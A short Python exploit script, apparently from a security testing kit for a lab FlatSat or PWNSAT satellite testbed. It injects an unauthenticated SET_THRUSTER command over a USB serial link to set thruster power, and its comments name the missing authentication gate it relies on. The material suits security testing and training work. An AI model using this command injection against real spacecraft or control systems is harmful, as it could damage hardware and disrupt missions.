#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 03_command_injection_usb.py -- SET_THRUSTER with no authentication,
# delivered over FlatSat's real USB CDC serial link instead of RF. "Round 1"
# (USB) -- see 03_command_injection_rf.py in this same folder for the
# original RF version, which has the full root-cause writeup
# (groundStationCommandAllowed() defaulting to permissive, no auth gate on
# the actuator command itself).
#
# Same as the RF version: SET_THRUSTER never transmits a downlink TM even
# on success (confirmed via 00_recon_apid_enum's own sweep -- 0x004 falls
# into the "no matching response" bucket every time), so this script can't
# confirm the injection landed by listening for a reply, over USB or RF --
# the only ground truth is the FlatSat's own serial console line
# ("Thruster N changed to: P") or watching PWNSAT-C3's Thruster gauge jump.
#
# NOT YET VALIDATED ON REAL HARDWARE -- see lib/flatsat_usb.py's header.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat_usb import FlatSatUSB  # noqa: E402


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--thruster-id", type=int, choices=[0, 1], default=0,
                        help="which thruster to command (0 or 1)")
    parser.add_argument("--power", type=int, default=200, metavar="0-255",
                        help="raw power value, no clamp on the firmware side")
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--port", default=None,
                        help="serial port for the USBRadioLink (default: autodetect)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    if not 0 <= args.power <= 255:
        parser.error("--power must be 0-255")

    print(f"[*] SET_THRUSTER: thruster_id={args.thruster_id} power={args.power} "
          f"-- no authentication required")

    with FlatSatUSB(port=args.port, encrypt=(args.encrypt == "on"),
                    verbose=not args.quiet) as fsat:
        fsat.send_tc("thruster", seq=args.seq, thruster_id=args.thruster_id,
                     power=args.power, listen_seconds=1.0)

    print(f"[+] Sent over USB. SET_THRUSTER never transmits a downlink TM -- "
          f"confirm via the FlatSat's own serial console "
          f"(\"Thruster {args.thruster_id} changed to: {args.power}\") "
          f"or PWNSAT-C3's Thruster gauge.")


if __name__ == "__main__":
    main()
